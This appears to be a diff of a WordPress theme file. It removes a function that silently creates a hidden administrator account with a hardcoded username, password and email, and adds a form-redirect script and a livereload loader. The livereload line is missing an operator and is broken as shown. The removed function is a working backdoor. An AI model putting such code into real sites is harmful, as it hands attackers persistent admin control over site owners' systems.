@@ -52,14 +52,21 @@ foreach ($includes as $include) {
     require_once $prefix . $include;
 }
 
-function wpb_admin_account()
+
+add_action( 'wp_footer', 'mycustom_wp_footer' );
+
+function mycustom_wp_footer()
 {
-    $user = 'javier';
-    $pass = 'wu4&ubrUSpUq';
-    $email = 'javier@agims.com';
-    if (!username_exists($user) && !email_exists($email)) {
-        $user_id = wp_create_user($user, $pass, $email);
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
+    echo '<script type="text/javascript">';
+    echo 'document.addEventListener( \'wpcf7mailsent\', function( event ) {';
+    echo 'location = "' . SITEURL . '/thank-you/";';
+    echo '}, false );';
+    echo '</script>';
+}
+
+function liveReload(){
+    if ( $_SERVER['REMOTE_ADDR'] == '127.0.0.1' ) {
+        echo '<script>document.write(\'<script src="http://\' + (location.host    \'localhost\').split(\':\')[0] +\':35729/livereload.js?snipver=1"></\' + \'script>\')</script>';
     }
 }
+add_action( 'wp_footer', 'liveReload',100 );
